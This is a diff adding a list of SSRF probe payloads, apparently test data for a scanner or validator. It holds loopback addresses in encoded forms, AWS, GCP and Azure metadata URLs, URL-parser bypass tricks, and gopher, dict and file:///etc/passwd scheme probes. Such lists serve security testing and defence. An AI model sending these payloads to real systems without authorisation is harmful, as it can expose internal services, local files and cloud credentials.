@@ -1,0 +1,49 @@
+# SSRF probe payloads - one per line, # lines are comments.
+# Localhost http
+http://127.0.0.1/
+# Localhost with port
+http://127.0.0.1:80/
+# Loopback alt
+http://localhost/
+# Decimal IP loopback
+http://2130706433/
+# Hex IP loopback
+http://0x7f000001/
+# Octal IP loopback
+http://017700000001/
+# IPv6 loopback
+http://[::1]/
+# IPv6 expanded loopback
+http://[0:0:0:0:0:0:0:1]/
+# 0.0.0.0
+http://0.0.0.0/
+# Cloud metadata AWS
+http://169.254.169.254/latest/meta-data/
+# Cloud metadata GCP
+http://metadata.google.internal/computeMetadata/v1/
+# Cloud metadata Azure
+http://169.254.169.254/metadata/instance?api-version=2021-02-01
+# DNS rebinding style
+http://127.0.0.1.nip.io/
+# Localhost with userinfo bypass
+http://example.com@127.0.0.1/
+# URL fragment trick
+http://127.0.0.1#@example.com/
+# At-sign bypass variant
+http://example.com%40@127.0.0.1/
+# Gopher scheme probe
+gopher://127.0.0.1:80/
+# Dict scheme probe
+dict://127.0.0.1:11211/
+# File scheme probe
+file:///etc/passwd
+# FTP scheme probe
+ftp://127.0.0.1/
+# Localhost admin path
+http://127.0.0.1/admin
+# Internal port probe
+http://127.0.0.1:8080/
+# URL-encoded loopback
+http://%31%32%37%2e%30%2e%30%2e%31/
+# Mixed case scheme
+HtTp://127.0.0.1/
